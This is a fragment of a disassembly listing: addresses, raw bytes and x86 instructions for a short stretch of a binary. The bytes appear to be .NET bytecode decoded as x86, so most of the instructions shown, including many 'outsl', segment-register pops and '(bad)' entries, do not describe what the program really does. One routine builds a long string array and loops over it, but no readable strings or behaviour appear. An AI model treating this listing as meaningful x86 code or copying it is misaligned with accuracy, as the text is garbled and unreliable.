  40303e:	6f                   	outsl  %ds:(%esi),(%dx)
  40303f:	1b 00                	sbb    (%eax),%eax
  403041:	00 0a                	add    %cl,(%edx)
  403043:	02 28                	add    (%eax),%ch
  403045:	17                   	pop    %ss
  403046:	00 00                	add    %al,(%eax)
  403048:	0a 28                	or     (%eax),%ch
  40304a:	36 00 00             	add    %al,%ss:(%eax)
  40304d:	0a 2d 20 28 23 00    	or     0x232820,%ch
  403053:	00 0a                	add    %cl,(%edx)
  403055:	6f                   	outsl  %ds:(%esi),(%dx)
  403056:	11 00                	adc    %eax,(%eax)
  403058:	00 0a                	add    %cl,(%edx)
  40305a:	06                   	push   %es
  40305b:	6f                   	outsl  %ds:(%esi),(%dx)
  40305c:	1b 00                	sbb    (%eax),%eax
  40305e:	00 0a                	add    %cl,(%edx)
  403060:	02 28                	add    (%eax),%ch
  403062:	17                   	pop    %ss
  403063:	00 00                	add    %al,(%eax)
  403065:	0a 28                	or     (%eax),%ch
  403067:	7e 00                	jle    0x403069
  403069:	00 0a                	add    %cl,(%edx)
  40306b:	de 03                	fiadds (%ebx)
  40306d:	26 de 00             	fiadds %es:(%eax)
  403070:	08 17                	or     %dl,(%edi)
  403072:	58                   	pop    %eax
  403073:	0c 08                	or     $0x8,%al
  403075:	07                   	pop    %es
  403076:	8e 69 32             	mov    0x32(%ecx),%gs
  403079:	a8 2a                	test   $0x2a,%al
  40307b:	00 01                	add    %al,(%ecx)
  40307d:	10 00                	adc    %al,(%eax)
  40307f:	00 00                	add    %al,(%eax)
  403081:	00 38                	add    %bh,(%eax)
  403083:	00 1d 55 00 03 01    	add    %bl,0x1030055
  403089:	00 00                	add    %al,(%eax)
  40308b:	01 13                	add    %edx,(%ebx)
  40308d:	30 03                	xor    %al,(%ebx)
  40308f:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  403093:	00 19                	add    %bl,(%ecx)
  403095:	00 00                	add    %al,(%eax)
  403097:	11 73 6e             	adc    %esi,0x6e(%ebx)
  40309a:	00 00                	add    %al,(%eax)
  40309c:	0a 0a                	or     (%edx),%cl
  40309e:	73 7f                	jae    0x40311f
  4030a0:	00 00                	add    %al,(%eax)
  4030a2:	0a 0b                	or     (%ebx),%cl
  4030a4:	07                   	pop    %es
  4030a5:	72 38                	jb     0x4030df
  4030a7:	09 00                	or     %eax,(%eax)
  4030a9:	70 6f                	jo     0x40311a
  4030ab:	80 00 00             	addb   $0x0,(%eax)
  4030ae:	0a 07                	or     (%edi),%al
  4030b0:	72 48                	jb     0x4030fa
  4030b2:	09 00                	or     %eax,(%eax)
  4030b4:	70 02                	jo     0x4030b8
  4030b6:	28 17                	sub    %dl,(%edi)
  4030b8:	00 00                	add    %al,(%eax)
  4030ba:	0a 6f 81             	or     -0x7f(%edi),%ch
  4030bd:	00 00                	add    %al,(%eax)
  4030bf:	0a 07                	or     (%edi),%al
  4030c1:	17                   	pop    %ss
  4030c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c3:	73 00                	jae    0x4030c5
  4030c5:	00 0a                	add    %cl,(%edx)
  4030c7:	06                   	push   %es
  4030c8:	07                   	pop    %es
  4030c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4030cb:	00 00                	add    %al,(%eax)
  4030cd:	0a 06                	or     (%esi),%al
  4030cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d0:	70 00                	jo     0x4030d2
  4030d2:	00 0a                	add    %cl,(%edx)
  4030d4:	26 06                	es push %es
  4030d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d7:	82 00 00             	addb   $0x0,(%eax)
  4030da:	0a 2a                	or     (%edx),%ch
  4030dc:	2e 72 50             	jb,pn  0x40312f
  4030df:	09 00                	or     %eax,(%eax)
  4030e1:	70 28                	jo     0x40310b
  4030e3:	1b 00                	sbb    (%eax),%eax
  4030e5:	00 06                	add    %al,(%esi)
  4030e7:	2a 2e                	sub    (%esi),%ch
  4030e9:	72 ca                	jb     0x4030b5
  4030eb:	09 00                	or     %eax,(%eax)
  4030ed:	70 28                	jo     0x403117
  4030ef:	1b 00                	sbb    (%eax),%eax
  4030f1:	00 06                	add    %al,(%esi)
  4030f3:	2a 2e                	sub    (%esi),%ch
  4030f5:	72 97                	jb     0x40308e
  4030f7:	0a 00                	or     (%eax),%al
  4030f9:	70 28                	jo     0x403123
  4030fb:	1b 00                	sbb    (%eax),%eax
  4030fd:	00 06                	add    %al,(%esi)
  4030ff:	2a 1b                	sub    (%ebx),%bl
  403101:	30 03                	xor    %al,(%ebx)
  403103:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403106:	00 00                	add    %al,(%eax)
  403108:	17                   	pop    %ss
  403109:	00 00                	add    %al,(%eax)
  40310b:	11 7e 16             	adc    %edi,0x16(%esi)
  40310e:	00 00                	add    %al,(%eax)
  403110:	0a 72 d3             	or     -0x2d(%edx),%dh
  403113:	0a 00                	or     (%eax),%al
  403115:	70 6f                	jo     0x403186
  403117:	18 00                	sbb    %al,(%eax)
  403119:	00 0a                	add    %cl,(%edx)
  40311b:	0a 06                	or     (%esi),%al
  40311d:	72 47                	jb     0x403166
  40311f:	0b 00                	or     (%eax),%eax
  403121:	70 72                	jo     0x403195
  403123:	65 0b 00             	or     %gs:(%eax),%eax
  403126:	70 6f                	jo     0x403197
  403128:	7d 00                	jge    0x40312a
  40312a:	00 0a                	add    %cl,(%edx)
  40312c:	06                   	push   %es
  40312d:	6f                   	outsl  %ds:(%esi),(%dx)
  40312e:	1a 00                	sbb    (%eax),%al
  403130:	00 0a                	add    %cl,(%edx)
  403132:	de 03                	fiadds (%ebx)
  403134:	26 de 00             	fiadds %es:(%eax)
  403137:	2a 01                	sub    (%ecx),%al
  403139:	10 00                	adc    %al,(%eax)
  40313b:	00 00                	add    %al,(%eax)
  40313d:	00 00                	add    %al,(%eax)
  40313f:	00 28                	add    %ch,(%eax)
  403141:	28 00                	sub    %al,(%eax)
  403143:	03 01                	add    (%ecx),%eax
  403145:	00 00                	add    %al,(%eax)
  403147:	01 1b                	add    %ebx,(%ebx)
  403149:	30 03                	xor    %al,(%ebx)
  40314b:	00 aa 01 00 00 1a    	add    %ch,0x1a000001(%edx)
  403151:	00 00                	add    %al,(%eax)
  403153:	11 1f                	adc    %ebx,(%edi)
  403155:	2a 8d 14 00 00 01    	sub    0x1000014(%ebp),%cl
  40315b:	0d 09 16 72 69       	or     $0x69721609,%eax
  403160:	0b 00                	or     (%eax),%eax
  403162:	70 a2                	jo     0x403106
  403164:	09 17                	or     %edx,(%edi)
  403166:	72 97                	jb     0x4030ff
  403168:	0b 00                	or     (%eax),%eax
  40316a:	70 a2                	jo     0x40310e
  40316c:	09 18                	or     %ebx,(%eax)
  40316e:	72 d1                	jb     0x403141
  403170:	0b 00                	or     (%eax),%eax
  403172:	70 a2                	jo     0x403116
  403174:	09 19                	or     %ebx,(%ecx)
  403176:	72 f9                	jb     0x403171
  403178:	0b 00                	or     (%eax),%eax
  40317a:	70 a2                	jo     0x40311e
  40317c:	09 1a                	or     %ebx,(%edx)
  40317e:	72 31                	jb     0x4031b1
  403180:	0c 00                	or     $0x0,%al
  403182:	70 a2                	jo     0x403126
  403184:	09 1b                	or     %ebx,(%ebx)
  403186:	72 39                	jb     0x4031c1
  403188:	0c 00                	or     $0x0,%al
  40318a:	70 a2                	jo     0x40312e
  40318c:	09 1c 72             	or     %ebx,(%edx,%esi,2)
  40318f:	41                   	inc    %ecx
  403190:	0c 00                	or     $0x0,%al
  403192:	70 a2                	jo     0x403136
  403194:	09 1d 72 4b 0c 00    	or     %ebx,0xc4b72
  40319a:	70 a2                	jo     0x40313e
  40319c:	09 1e                	or     %ebx,(%esi)
  40319e:	72 59                	jb     0x4031f9
  4031a0:	0c 00                	or     $0x0,%al
  4031a2:	70 a2                	jo     0x403146
  4031a4:	09 1f                	or     %ebx,(%edi)
  4031a6:	09 72 67             	or     %esi,0x67(%edx)
  4031a9:	0c 00                	or     $0x0,%al
  4031ab:	70 a2                	jo     0x40314f
  4031ad:	09 1f                	or     %ebx,(%edi)
  4031af:	0a 72 73             	or     0x73(%edx),%dh
  4031b2:	0c 00                	or     $0x0,%al
  4031b4:	70 a2                	jo     0x403158
  4031b6:	09 1f                	or     %ebx,(%edi)
  4031b8:	0b 72 81             	or     -0x7f(%edx),%esi
  4031bb:	0c 00                	or     $0x0,%al
  4031bd:	70 a2                	jo     0x403161
  4031bf:	09 1f                	or     %ebx,(%edi)
  4031c1:	0c 72                	or     $0x72,%al
  4031c3:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  4031c6:	70 a2                	jo     0x40316a
  4031c8:	09 1f                	or     %ebx,(%edi)
  4031ca:	0d 72 99 0c 00       	or     $0xc9972,%eax
  4031cf:	70 a2                	jo     0x403173
  4031d1:	09 1f                	or     %ebx,(%edi)
  4031d3:	0e                   	push   %cs
  4031d4:	72 a5                	jb     0x40317b
  4031d6:	0c 00                	or     $0x0,%al
  4031d8:	70 a2                	jo     0x40317c
  4031da:	09 1f                	or     %ebx,(%edi)
  4031dc:	0f 72                	pslld  $0x72,(bad)
  4031de:	b1 0c                	mov    $0xc,%cl
  4031e0:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031e3:	09 1f                	or     %ebx,(%edi)
  4031e5:	10 72 c1             	adc    %dh,-0x3f(%edx)
  4031e8:	0c 00                	or     $0x0,%al
  4031ea:	70 a2                	jo     0x40318e
  4031ec:	09 1f                	or     %ebx,(%edi)
  4031ee:	11 72 d3             	adc    %esi,-0x2d(%edx)
  4031f1:	0c 00                	or     $0x0,%al
  4031f3:	70 a2                	jo     0x403197
  4031f5:	09 1f                	or     %ebx,(%edi)
  4031f7:	12 72 e5             	adc    -0x1b(%edx),%dh
  4031fa:	0c 00                	or     $0x0,%al
  4031fc:	70 a2                	jo     0x4031a0
  4031fe:	09 1f                	or     %ebx,(%edi)
  403200:	13 72 f5             	adc    -0xb(%edx),%esi
  403203:	0c 00                	or     $0x0,%al
  403205:	70 a2                	jo     0x4031a9
  403207:	09 1f                	or     %ebx,(%edi)
  403209:	14 72                	adc    $0x72,%al
  40320b:	05 0d 00 70 a2       	add    $0xa270000d,%eax
  403210:	09 1f                	or     %ebx,(%edi)
  403212:	15 72 1d 0d 00       	adc    $0xd1d72,%eax
  403217:	70 a2                	jo     0x4031bb
  403219:	09 1f                	or     %ebx,(%edi)
  40321b:	16                   	push   %ss
  40321c:	72 49                	jb     0x403267
  40321e:	0d 00 70 a2 09       	or     $0x9a27000,%eax
  403223:	1f                   	pop    %ds
  403224:	17                   	pop    %ss
  403225:	72 5d                	jb     0x403284
  403227:	0d 00 70 a2 09       	or     $0x9a27000,%eax
  40322c:	1f                   	pop    %ds
  40322d:	18 72 69             	sbb    %dh,0x69(%edx)
  403230:	0d 00 70 a2 09       	or     $0x9a27000,%eax
  403235:	1f                   	pop    %ds
  403236:	19 72 59             	sbb    %esi,0x59(%edx)
  403239:	0c 00                	or     $0x0,%al
  40323b:	70 a2                	jo     0x4031df
  40323d:	09 1f                	or     %ebx,(%edi)
  40323f:	1a 72 85             	sbb    -0x7b(%edx),%dh
  403242:	0d 00 70 a2 09       	or     $0x9a27000,%eax
  403247:	1f                   	pop    %ds
  403248:	1b 72 a1             	sbb    -0x5f(%edx),%esi
  40324b:	0d 00 70 a2 09       	or     $0x9a27000,%eax
  403250:	1f                   	pop    %ds
  403251:	1c 72                	sbb    $0x72,%al
  403253:	b3 0d                	mov    $0xd,%bl
  403255:	00 70 a2             	add    %dh,-0x5e(%eax)
  403258:	09 1f                	or     %ebx,(%edi)
  40325a:	1d 72 d9 0d 00       	sbb    $0xdd972,%eax
  40325f:	70 a2                	jo     0x403203
  403261:	09 1f                	or     %ebx,(%edi)
  403263:	1e                   	push   %ds
  403264:	72 fd                	jb     0x403263
  403266:	0d 00 70 a2 09       	or     $0x9a27000,%eax
  40326b:	1f                   	pop    %ds
  40326c:	1f                   	pop    %ds
  40326d:	72 2b                	jb     0x40329a
  40326f:	0e                   	push   %cs
  403270:	00 70 a2             	add    %dh,-0x5e(%eax)
  403273:	09 1f                	or     %ebx,(%edi)
  403275:	20 72 67             	and    %dh,0x67(%edx)
  403278:	0c 00                	or     $0x0,%al
  40327a:	70 a2                	jo     0x40321e
  40327c:	09 1f                	or     %ebx,(%edi)
  40327e:	21 72 43             	and    %esi,0x43(%edx)
  403281:	0e                   	push   %cs
  403282:	00 70 a2             	add    %dh,-0x5e(%eax)
  403285:	09 1f                	or     %ebx,(%edi)
  403287:	22 72 5d             	and    0x5d(%edx),%dh
  40328a:	0e                   	push   %cs
  40328b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40328e:	09 1f                	or     %ebx,(%edi)
  403290:	23 72 89             	and    -0x77(%edx),%esi
  403293:	0e                   	push   %cs
  403294:	00 70 a2             	add    %dh,-0x5e(%eax)
  403297:	09 1f                	or     %ebx,(%edi)
  403299:	24 72                	and    $0x72,%al
  40329b:	bf 0e 00 70 a2       	mov    $0xa270000e,%edi
  4032a0:	09 1f                	or     %ebx,(%edi)
  4032a2:	25 72 e9 0e 00       	and    $0xee972,%eax
  4032a7:	70 a2                	jo     0x40324b
  4032a9:	09 1f                	or     %ebx,(%edi)
  4032ab:	26 72 ff             	es jb  0x4032ad
  4032ae:	0e                   	push   %cs
  4032af:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032b2:	09 1f                	or     %ebx,(%edi)
  4032b4:	27                   	daa
  4032b5:	72 19                	jb     0x4032d0
  4032b7:	0f 00                	(bad)
  4032b9:	70 a2                	jo     0x40325d
  4032bb:	09 1f                	or     %ebx,(%edi)
  4032bd:	28 72 35             	sub    %dh,0x35(%edx)
  4032c0:	0f 00                	(bad)
  4032c2:	70 a2                	jo     0x403266
  4032c4:	09 1f                	or     %ebx,(%edi)
  4032c6:	29 72 53             	sub    %esi,0x53(%edx)
  4032c9:	0f 00                	(bad)
  4032cb:	70 a2                	jo     0x40326f
  4032cd:	09 0a                	or     %ecx,(%edx)
  4032cf:	06                   	push   %es
  4032d0:	13 04 16             	adc    (%esi,%edx,1),%eax
  4032d3:	13 05 2b 1e 11 04    	adc    0x4111e2b,%eax
  4032d9:	11 05 9a 0b 07 73    	adc    %eax,0x73070b9a
  4032df:	83 00 00             	addl   $0x0,(%eax)
  4032e2:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4032e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032e6:	84 00                	test   %al,(%eax)
  4032e8:	00 0a                	add    %cl,(%edx)
  4032ea:	de 03                	fiadds (%ebx)
  4032ec:	26 de 00             	fiadds %es:(%eax)
  4032ef:	11 05 17 58 13 05    	adc    %eax,0x5135817
  4032f5:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  4032fb:	32 da                	xor    %dl,%bl
  4032fd:	2a 00                	sub    (%eax),%al
  4032ff:	00 01                	add    %al,(%ecx)
  403301:	10 00                	adc    %al,(%eax)
  403303:	00 00                	add    %al,(%eax)
  403305:	00 89 01 0f 98 01    	add    %cl,0x1980f01(%ecx)
  40330b:	03 01                	add    (%ecx),%eax
  40330d:	00 00                	add    %al,(%eax)
  40330f:	01 1b                	add    %ebx,(%ebx)
  403311:	30 04 00             	xor    %al,(%eax,%eax,1)
  403314:	41                   	inc    %ecx
  403315:	00 00                	add    %al,(%eax)
  403317:	00 15 00 00 11 02    	add    %dl,0x2110000
  40331d:	72 a5                	jb     0x4032c4
  40331f:	00 00                	add    %al,(%eax)
  403321:	70 28                	jo     0x40334b
  403323:	14 00                	adc    $0x0,%al
  403325:	00 0a                	add    %cl,(%edx)
  403327:	2c 33                	sub    $0x33,%al
  403329:	28 85 00 00 0a 1f    	sub    %al,0x1f0a0000(%ebp)
  40332f:	09 28                	or     %ebp,(%eax)
  403331:	08 00                	or     %al,(%eax)
  403333:	00 06                	add    %al,(%esi)
  403335:	72 69                	jb     0x4033a0
  403337:	0f 00                	(bad)
  403339:	70 28                	jo     0x403363
  40333b:	35 00 00 0a 0a       	xor    $0xa0a0000,%eax
  403340:	06                   	push   %es
  403341:	02 28                	add    (%eax),%ch
  403343:	86 00                	xchg   %al,(%eax)
  403345:	00 0a                	add    %cl,(%edx)
  403347:	28 6b 00             	sub    %ch,0x0(%ebx)
  40334a:	00 0a                	add    %cl,(%edx)
  40334c:	1f                   	pop    %ds
  40334d:	14 16                	adc    $0x16,%al
  40334f:	06                   	push   %es
  403350:	19 28                	sbb    %ebp,(%eax)
  403352:	01 00                	add    %eax,(%eax)
  403354:	00 06                	add    %al,(%esi)
  403356:	26 de 03             	fiadds %es:(%ebx)
  403359:	26 de 00             	fiadds %es:(%eax)
  40335c:	2a 00                	sub    (%eax),%al
  40335e:	00 00                	add    %al,(%eax)
  403360:	01 10                	add    %edx,(%eax)
  403362:	00 00                	add    %al,(%eax)
  403364:	00 00                	add    %al,(%eax)
  403366:	0d 00 30 3d 00       	or     $0x3d3000,%eax
  40336b:	03 01                	add    (%ecx),%eax
  40336d:	00 00                	add    %al,(%eax)
  40336f:	01 13                	add    %edx,(%ebx)
  403371:	30 03                	xor    %al,(%ebx)
  403373:	00 43 01             	add    %al,0x1(%ebx)
  403376:	00 00                	add    %al,(%eax)
  403378:	1b 00                	sbb    (%eax),%eax
  40337a:	00 11                	add    %dl,(%ecx)
  40337c:	1f                   	pop    %ds
  40337d:	20 8d 30 00 00 01    	and    %cl,0x1000030(%ebp)
  403383:	80 01 00             	addb   $0x0,(%ecx)
  403386:	00 04 28             	add    %al,(%eax,%ebp,1)
  403389:	87 00                	xchg   %eax,(%eax)
  40338b:	00 0a                	add    %cl,(%edx)
  40338d:	80 02 00             	addb   $0x0,(%edx)
  403390:	00 04 72             	add    %al,(%edx,%esi,2)
  403393:	73 0f                	jae    0x4033a4
  403395:	00 70 80             	add    %dh,-0x80(%eax)
  403398:	03 00                	add    (%eax),%eax
  40339a:	00 04 72             	add    %al,(%edx,%esi,2)
  40339d:	87 0f                	xchg   %ecx,(%edi)
  40339f:	00 70 80             	add    %dh,-0x80(%eax)
  4033a2:	04 00                	add    $0x0,%al
  4033a4:	00 04 17             	add    %al,(%edi,%edx,1)
  4033a7:	80 05 00 00 04 72 a5 	addb   $0xa5,0x72040000
  4033ae:	00 00                	add    %al,(%eax)
  4033b0:	70 80                	jo     0x403332
  4033b2:	06                   	push   %es
  4033b3:	00 00                	add    %al,(%eax)
  4033b5:	04 17                	add    $0x17,%al
  4033b7:	80 07 00             	addb   $0x0,(%edi)
  4033ba:	00 04 72             	add    %al,(%edx,%esi,2)
  4033bd:	af                   	scas   %es:(%edi),%eax
  4033be:	0f 00                	(bad)
  4033c0:	70 80                	jo     0x403342
  4033c2:	08 00                	or     %al,(%eax)
  4033c4:	00 04 17             	add    %al,(%edi,%edx,1)
  4033c7:	80 09 00             	orb    $0x0,(%ecx)
  4033ca:	00 04 72             	add    %al,(%edx,%esi,2)
  4033cd:	c9                   	leave
  4033ce:	0f 00                	(bad)
  4033d0:	70 80                	jo     0x403352
  4033d2:	0a 00                	or     (%eax),%al
  4033d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4033d7:	db 0f                	fisttpl (%edi)
  4033d9:	00 70 80             	add    %dh,-0x80(%eax)
  4033dc:	0b 00                	or     (%eax),%eax
  4033de:	00 04 17             	add    %al,(%edi,%edx,1)
  4033e1:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4033e5:	04 17                	add    $0x17,%al
  4033e7:	80 0d 00 00 04 20 40 	orb    $0x40,0x20040000
  4033ee:	0d 03 00 80 0e       	or     $0xe800003,%eax
  4033f3:	00 00                	add    %al,(%eax)
  4033f5:	04 72                	add    $0x72,%al
  4033f7:	05 10 00 70 80       	add    $0x80700010,%eax
  4033fc:	0f 00 00             	sldt   (%eax)
  4033ff:	04 72                	add    $0x72,%al
  403401:	1f                   	pop    %ds
  403402:	10 00                	adc    %al,(%eax)
  403404:	70 80                	jo     0x403386
  403406:	10 00                	adc    %al,(%eax)
  403408:	00 04 72             	add    %al,(%edx,%esi,2)
  40340b:	4b                   	dec    %ebx
  40340c:	10 00                	adc    %al,(%eax)
  40340e:	70 80                	jo     0x403390
  403410:	11 00                	adc    %eax,(%eax)
  403412:	00 04 17             	add    %al,(%edi,%edx,1)
  403415:	80 12 00             	adcb   $0x0,(%edx)
  403418:	00 04 17             	add    %al,(%edi,%edx,1)
  40341b:	80 13 00             	adcb   $0x0,(%ebx)
  40341e:	00 04 17             	add    %al,(%edi,%edx,1)
  403421:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  403425:	04 17                	add    $0x17,%al
  403427:	80 15 00 00 04 17 80 	adcb   $0x80,0x17040000
  40342e:	16                   	push   %ss
  40342f:	00 00                	add    %al,(%eax)
  403431:	04 17                	add    $0x17,%al
  403433:	80 17 00             	adcb   $0x0,(%edi)
  403436:	00 04 72             	add    %al,(%edx,%esi,2)
  403439:	61                   	popa
  40343a:	10 00                	adc    %al,(%eax)
  40343c:	70 80                	jo     0x4033be
  40343e:	18 00                	sbb    %al,(%eax)
  403440:	00 04 7e             	add    %al,(%esi,%edi,2)
  403443:	18 00                	sbb    %al,(%eax)
  403445:	00 04 7e             	add    %al,(%esi,%edi,2)
  403448:	0b 00                	or     (%eax),%eax
  40344a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40344d:	17                   	pop    %ss
  40344e:	00 00                	add    %al,(%eax)
  403450:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  403456:	72 7f                	jb     0x4034d7
  403458:	10 00                	adc    %al,(%eax)
  40345a:	70 80                	jo     0x4033dc
  40345c:	1a 00                	sbb    (%eax),%al
  40345e:	00 04 7e             	add    %al,(%esi,%edi,2)
  403461:	1a 00                	sbb    (%eax),%al
  403463:	00 04 7e             	add    %al,(%esi,%edi,2)
  403466:	10 00                	adc    %al,(%eax)
  403468:	00 04 7e             	add    %al,(%esi,%edi,2)
  40346b:	04 00                	add    $0x0,%al
  40346d:	00 04 28             	add    %al,(%eax,%ebp,1)
  403470:	35 00 00 0a 80       	xor    $0x800a0000,%eax
  403475:	1b 00                	sbb    (%eax),%eax
  403477:	00 04 72             	add    %al,(%edx,%esi,2)
  40347a:	85 10                	test   %edx,(%eax)
  40347c:	00 70 73             	add    %dh,0x73(%eax)
  40347f:	88 00                	mov    %al,(%eax)
  403481:	00 0a                	add    %cl,(%edx)
  403483:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403487:	04 73                	add    $0x73,%al
  403489:	89 00                	mov    %eax,(%eax)
  40348b:	00 0a                	add    %cl,(%edx)
  40348d:	0a 06                	or     (%esi),%al
  40348f:	72 f9                	jb     0x40348a
  403491:	10 00                	adc    %al,(%eax)
  403493:	70 6f                	jo     0x403504
  403495:	8a 00                	mov    (%eax),%al
  403497:	00 0a                	add    %cl,(%edx)
  403499:	06                   	push   %es
  40349a:	80 1d 00 00 04 17 8d 	sbbb   $0x8d,0x17040000
  4034a1:	14 00                	adc    $0x0,%al
  4034a3:	00 01                	add    %al,(%ecx)
  4034a5:	0b 07                	or     (%edi),%eax
  4034a7:	16                   	push   %ss
  4034a8:	72 1f                	jb     0x4034c9
  4034aa:	11 00                	adc    %eax,(%eax)
  4034ac:	70 a2                	jo     0x403450
  4034ae:	07                   	pop    %es
  4034af:	80 1e 00             	sbbb   $0x0,(%esi)
  4034b2:	00 04 73             	add    %al,(%ebx,%esi,2)
  4034b5:	40                   	inc    %eax
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  4034be:	2a 1e                	sub    (%esi),%bl
  4034c0:	02 28                	add    (%eax),%ch
  4034c2:	2c 00                	sub    $0x0,%al
  4034c4:	00 0a                	add    %cl,(%edx)
  4034c6:	2a 36                	sub    (%esi),%dh
  4034c8:	1f                   	pop    %ds
  4034c9:	fd                   	std
  4034ca:	73 8b                	jae    0x403457
  4034cc:	00 00                	add    %al,(%eax)
  4034ce:	0a 80 22 00 00 04    	or     0x4000022(%eax),%al
  4034d4:	2a 1e                	sub    (%esi),%bl
  4034d6:	02 28                	add    (%eax),%ch
  4034d8:	2c 00                	sub    $0x0,%al
  4034da:	00 0a                	add    %cl,(%edx)
  4034dc:	2a 92 02 28 8c 00    	sub    0x8c2802(%edx),%dl
  4034e2:	00 0a                	add    %cl,(%edx)
  4034e4:	02 28                	add    (%eax),%ch
  4034e6:	8d 00                	lea    (%eax),%eax
  4034e8:	00 0a                	add    %cl,(%edx)
  4034ea:	7e 22                	jle    0x40350e
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	04 28                	add    $0x28,%al
  4034f0:	26 00 00             	add    %al,%es:(%eax)
  4034f3:	06                   	push   %es
  4034f4:	26 02 28             	add    %es:(%eax),%ch
  4034f7:	8d 00                	lea    (%eax),%eax
  4034f9:	00 0a                	add    %cl,(%edx)
  4034fb:	28 25 00 00 06 26    	sub    %ah,0x26060000
  403501:	2a 5a 03             	sub    0x3(%edx),%bl
  403504:	7e 23                	jle    0x403529
  403506:	00 00                	add    %al,(%eax)
  403508:	04 6f                	add    $0x6f,%al
  40350a:	8e 00                	mov    (%eax),%es
  40350c:	00 0a                	add    %cl,(%edx)
  40350e:	6f                   	outsl  %ds:(%esi),(%dx)
  40350f:	8f 00                	pop    (%eax)
  403511:	00 0a                	add    %cl,(%edx)
  403513:	2c 02                	sub    $0x2,%al
  403515:	17                   	pop    %ss
  403516:	2a 16                	sub    (%esi),%dl
  403518:	2a 00                	sub    (%eax),%al
  40351a:	00 00                	add    %al,(%eax)
  40351c:	13 30                	adc    (%eax),%esi
  40351e:	03 00                	add    (%eax),%eax
  403520:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403521:	00 00                	add    %al,(%eax)
  403523:	00 02                	add    %al,(%edx)
  403525:	00 00                	add    %al,(%eax)
  403527:	11 03                	adc    %eax,(%ebx)
  403529:	28 90 00 00 0a 20    	sub    %dl,0x200a0000(%eax)
  40352f:	1d 03 00 00 40       	sbb    $0x40000003,%eax
  403534:	8f 00                	pop    (%eax)
  403536:	00 00                	add    %al,(%eax)
  403538:	28 2d 00 00 06 80    	sub    %ch,0x80060000
  40353e:	23 00                	and    (%eax),%eax
  403540:	00 04 7e             	add    %al,(%esi,%edi,2)
  403543:	23 00                	and    (%eax),%eax
  403545:	00 04 72             	add    %al,(%edx,%esi,2)
  403548:	35 11 00 70 6f       	xor    $0x6f700011,%eax
  40354d:	91                   	xchg   %eax,%ecx
  40354e:	00 00                	add    %al,(%eax)
  403550:	0a 2c 3b             	or     (%ebx,%edi,1),%ch
  403553:	02 7e 1c             	add    0x1c(%esi),%bh
  403556:	00 00                	add    %al,(%eax)
  403558:	04 28                	add    $0x28,%al
  40355a:	2a 00                	sub    (%eax),%al
  40355c:	00 06                	add    %al,(%esi)
  40355e:	2c 67                	sub    $0x67,%al
  403560:	7e 23                	jle    0x403585
  403562:	00 00                	add    %al,(%eax)
  403564:	04 7e                	add    $0x7e,%al
  403566:	1b 00                	sbb    (%eax),%eax
  403568:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40356b:	3e 00 00             	add    %al,%ds:(%eax)
  40356e:	0a 2d 56 7e 1c 00    	or     0x1c7e56,%ch
  403574:	00 04 7e             	add    %al,(%esi,%edi,2)
  403577:	23 00                	and    (%eax),%eax
  403579:	00 04 7e             	add    %al,(%esi,%edi,2)
  40357c:	1b 00                	sbb    (%eax),%eax
  40357e:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403581:	92                   	xchg   %eax,%edx
  403582:	00 00                	add    %al,(%eax)
  403584:	0a 0a                	or     (%edx),%cl
  403586:	06                   	push   %es
  403587:	28 2e                	sub    %ch,(%esi)
  403589:	00 00                	add    %al,(%eax)
  40358b:	06                   	push   %es
  40358c:	2b 39                	sub    (%ecx),%edi
  40358e:	02 7e 1c             	add    0x1c(%esi),%bh
  403591:	00 00                	add    %al,(%eax)
  403593:	04 28                	add    $0x28,%al
  403595:	2a 00                	sub    (%eax),%al
  403597:	00 06                	add    %al,(%esi)
  403599:	2c 2c                	sub    $0x2c,%al
  40359b:	7e 23                	jle    0x4035c0
  40359d:	00 00                	add    %al,(%eax)
  40359f:	04 7e                	add    $0x7e,%al
  4035a1:	19 00                	sbb    %eax,(%eax)
  4035a3:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4035a6:	3e 00 00             	add    %al,%ds:(%eax)
  4035a9:	0a 2d 1b 7e 1c 00    	or     0x1c7e1b,%ch
  4035af:	00 04 7e             	add    %al,(%esi,%edi,2)
  4035b2:	23 00                	and    (%eax),%eax
  4035b4:	00 04 7e             	add    %al,(%esi,%edi,2)
  4035b7:	19 00                	sbb    %eax,(%eax)
  4035b9:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4035bc:	92                   	xchg   %eax,%edx
  4035bd:	00 00                	add    %al,(%eax)
  4035bf:	0a 0b                	or     (%ebx),%cl
  4035c1:	07                   	pop    %es
  4035c2:	28 2e                	sub    %ch,(%esi)
  4035c4:	00 00                	add    %al,(%eax)
  4035c6:	06                   	push   %es
  4035c7:	02 03                	add    (%ebx),%al
  4035c9:	28 93 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ebx)
  4035cf:	00 13                	add    %dl,(%ebx)
  4035d1:	30 03                	xor    %al,(%ebx)
  4035d3:	00 1b                	add    %bl,(%ebx)
  4035d5:	00 00                	add    %al,(%eax)
  4035d7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4035da:	00 11                	add    %dl,(%ecx)
  4035dc:	02 28                	add    (%eax),%ch
  4035de:	94                   	xchg   %eax,%esp
  4035df:	00 00                	add    %al,(%eax)
